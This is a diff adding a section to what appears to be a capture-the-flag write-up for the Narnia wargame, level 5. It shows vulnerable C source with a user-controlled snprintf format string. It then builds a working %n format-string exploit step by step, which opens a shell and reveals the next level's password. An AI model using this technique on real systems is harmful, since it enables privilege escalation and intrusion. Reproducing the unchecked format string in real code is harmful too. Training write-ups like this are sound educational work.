@@ -415,3 +415,92 @@ $ cat /etc/narnia_pass/narnia5
 ```
 
 ![Get Shell - Narnia 4](assets/narnia4.png)
+
+
+## Narnia 5
+
+Below goes the source code for narnia 5.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char **argv){
+	int i = 1;
+	char buffer[64];
+
+	snprintf(buffer, sizeof buffer, argv[1]);
+	buffer[sizeof (buffer) - 1] = 0;
+	printf("Change i's value from 1 -> 500. ");
+
+	if(i==500){
+		printf("GOOD\n");
+        setreuid(geteuid(),geteuid());
+		system("/bin/sh");
+	}
+
+	printf("No way...let me give you a hint!\n");
+	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+	printf ("i = %d (%p)\n", i, &i);
+	return 0;
+}
+```
+
+And we can spot that the first argument of `snprintf`, `buffer`, which serves
+as the template/format string, is acutally user-controllable because this
+program prints `argv[1]` into `buffer`.
+
+There is an infamous behaviour in `snprintf`, `%n`, which writes how many bytes
+it have written to the string. And of course we will take advantage of that to
+capture the flag.
+
+Another default behaviour in `snprintf` is that if you specify something like
+`%100s` to get a string that contains 100 characters and your stdin has EOF'ed,
+then `snprintf` will fill in ` ` (space) for you.
+
+So the idea will be that we let `snprintf` to write 500 bytes and then write
+`%n` exactly at `i`'s address. Let's find out `i`'s address first!
+
+```bash
+$ /narnia/narnia5
+Change i's value from 1 -> 500. No way...let me give you a hint!
+buffer : [] (0)
+i = 1 (0xffffd4f0)
+```
+
+And lastly, we should write `i`'s address at the beginning of `argv[1]`, in 
+binary of course. So it would be 
+
+```
+$ /narnia/narnia5 `echo -e '\xf0\xd4\xff\xff'`
+```
+
+and now `snprintf` will have read 4 bytes into buffer, so we can append `%496s`
+
+```
+$ /narnia/narnia5 `echo -e '\xf0\xd4\xff\xff%496s'`
+```
+
+After that, we should specify which location to write for the `%n`, and its
+syntax is something like `%1$n`, which means write the number of bytes 
+that currently read to the location of argument 1.
+
+```
+$ /narnia/narnia5 `echo -e '\xf0\xd4\xff\xff%496s%1$n'`
+```
+
+Also note that passing arguments to a program will effect the address of all
+variables on the stack.
+
+So we make a last minor correction to get the current location of variable `i`
+and everything will be set.
+
+```
+$ /narnia/narnia5 `echo -e '\xe0\xd4\xff\xff%496s%1$n'`
+Change i's value from 1 -> 500. GOOD
+$ cat /etc/narnia_pass/narnia6
+BAV0SUV0iM
+```
+
+![Get Shell - Narnia 5](assets/narnia5.png)
